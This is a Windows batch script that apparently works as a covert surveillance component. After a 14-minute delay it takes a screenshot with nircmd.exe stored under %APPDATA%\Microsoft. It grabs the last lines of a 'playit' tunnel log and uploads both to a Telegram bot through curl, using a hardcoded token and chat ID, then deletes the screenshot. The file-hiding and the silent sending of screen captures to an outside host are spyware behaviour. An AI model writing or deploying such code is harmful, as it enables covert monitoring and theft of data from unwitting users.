@echo off

del /f /q "%temp%\run_once.flag"

:: Run Once
if exist "%temp%\run_once.flag" goto skip_code


:: "%APPDATA%\Microsoft\nircmd.exe" monitor off
:: echo 1 > "%temp%\run_once.flag"

:skip_code




timeout /t 840 /nobreak

:again

cd /d "%~dp0"


"%APPDATA%\Microsoft\nircmd.exe" savescreenshot "%USERPROFILE%\Downloads\screenshot.png"


set "input_file=%appdata%\Microsoft\play\playit_output.log"
set "output_file=%appdata%\Microsoft\play\playit_7lines.log"


:: Use PowerShell to get the last 7 lines of the file and save them to the output file
powershell -Command "Get-Content '%input_file%' | Select-Object -Last 7 | Out-File '%output_file%'"

echo Last 7 lines have been saved to %output_file%

:SENDMSG

:: Set your bot token and chat ID
set "TOKEN=7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA"
set "CHAT_ID=-1002460905948"

:: Path to your photo
set "PHOTO_PATH=%USERPROFILE%\Downloads\screenshot.png"


:: Use PowerShell to read the contents of playit_7lines.log and URL-encode it
for /f "delims=" %%a in ('powershell -Command "(Get-Content '%output_file%' | Out-String).Trim() -replace ' ', '%%20' -replace '&', '%%26' -replace '\n', '%%0A'"') do set "ENCODED_MESSAGE=%%a"

curl -s -X POST "https://api.telegram.org/bot%TOKEN%/sendPhoto" ^
     -F "chat_id=%CHAT_ID%" ^
     -F "photo=@%PHOTO_PATH%"

:: Send the message using curl
curl -s -X POST "https://api.telegram.org/bot%TOKEN%/sendMessage" ^
     -d "chat_id=%CHAT_ID%" ^
     -d "text=%ENCODED_MESSAGE%"


del /f /q "%USERPROFILE%\Downloads\screenshot.png"

echo.
echo.
